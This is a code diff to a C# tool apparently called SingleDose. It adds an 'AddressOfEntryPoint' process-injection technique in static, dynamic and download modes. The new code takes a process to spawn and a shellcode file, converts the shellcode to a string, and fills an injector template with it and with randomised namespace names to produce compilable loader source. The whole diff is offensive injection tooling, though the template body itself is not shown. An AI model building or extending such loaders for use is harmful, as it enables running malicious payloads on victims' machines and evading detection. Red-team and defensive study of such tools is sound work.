@@ -578,6 +578,57 @@ namespace SingleDose
                     CSContents = regPattern.Replace(CSContents, "");
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                 }
+                else if (injTechnique == "AddressOfEntryPoint")
+                {
+                    string spawnProcess;
+                    Console.WriteLine("|   [~] Spawn process required. Enter Absolute Path: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        spawnProcess = Console.ReadLine();
+                    } while (string.IsNullOrEmpty(spawnProcess) && spawnProcess.ToLower() != "exit");
+
+                    if (spawnProcess.ToLower() == "exit")
+                    {
+                        return;
+                    }
+
+                    string shellCodePath;
+                    Console.WriteLine("|   [~] Enter path to shellcode: ");
+                    do
+                    {
+                        Console.Write("|       > ");
+                        shellCodePath = Console.ReadLine();
+                    } while (!File.Exists(shellCodePath) && shellCodePath.ToLower() != "exit");
+
+                    if (shellCodePath.ToLower() == "exit")
+                    {
+                        return;
+                    }
+                    Console.WriteLine("|");
+                    Program.WriteLog(injMode + ": " + injTechnique + " - Spawn: " + spawnProcess + " - Shellcode: " + shellCodePath, true);
+                    byte[] shellCode = File.ReadAllBytes(shellCodePath);
+                    string byteToString = ShellcodeBytesToString(shellCode, 1000, GenRandomString());
+                    string CSContents = ADDRESSOFENTRYPOINT.BODY;
+                    CSContents = ParseTriggers(CSContents);
+
+                    Regex QueuePattern;
+                    //Clear remaining trigger.
+                    QueuePattern = new Regex("{{TRIGGER}}");
+                    CSContents = QueuePattern.Replace(CSContents, "");
+                    QueuePattern = new Regex("{{MODE}}");
+                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.STATICMODE);
+                    QueuePattern = new Regex("{{SHELLCODE}}");
+                    CSContents = QueuePattern.Replace(CSContents, byteToString);
+                    QueuePattern = new Regex("{{SPAWN}}");
+                    CSContents = QueuePattern.Replace(CSContents, "@\"" + spawnProcess + "\"");
+                    QueuePattern = new Regex("{{NAMESPACE}}");
+                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
+                    QueuePattern = new Regex("{{ARGS}}");
+                    CSContents = QueuePattern.Replace(CSContents, "");
+
+                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
+                }
             }
             else if (injMode == "DYNAMIC")
             {
@@ -775,6 +826,27 @@ namespace SingleDose
                     
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                 }
+                else if (injTechnique == "AddressOfEntryPoint")
+                {
+                    Program.WriteLog(injMode + ": " + injTechnique, true);
+
+                    string CSContents = ADDRESSOFENTRYPOINT.BODY;
+                    CSContents = ParseTriggers(CSContents);
+
+                    Regex QueuePattern;
+                    //Clear remaining trigger.
+                    QueuePattern = new Regex("{{TRIGGER}}");
+                    CSContents = QueuePattern.Replace(CSContents, "");
+                    QueuePattern = new Regex("{{MODE}}");
+                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DYNAMICMODE);
+                    QueuePattern = new Regex("{{SPAWN}}");
+                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
+                    QueuePattern = new Regex("{{NAMESPACE}}");
+                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
+                    QueuePattern = new Regex("{{ARGS}}");
+                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DYNAMICARGPARSE);
+                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
+                }
             }
             else if (injMode == "DOWNLOAD")
             {
@@ -968,6 +1040,28 @@ namespace SingleDose
                     
                     WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false);
                 }
+                else if (injTechnique == "AddressOfEntryPoint")
+                {
+                    Program.WriteLog(injMode + ": " + injTechnique, true);
+                    string CSContents = ADDRESSOFENTRYPOINT.BODY;
+                    CSContents = ParseTriggers(CSContents);
+
+                    Regex QueuePattern;
+                    //Clear remaining trigger.
+                    QueuePattern = new Regex("{{TRIGGER}}");
+                    CSContents = QueuePattern.Replace(CSContents, "");
+                    QueuePattern = new Regex("{{MODE}}");
+                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DOWNLOADMODE);
+                    QueuePattern = new Regex("{{SPAWN}}");
+                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
+                    QueuePattern = new Regex("{{NAMESPACE}}");
+                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
+                    QueuePattern = new Regex("{{ARGS}}");
+                    CSContents = QueuePattern.Replace(CSContents, ADDRESSOFENTRYPOINT.DOWNLOADARGPARSE);
+
+                    WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true);
+                }
+
             }
         }
 
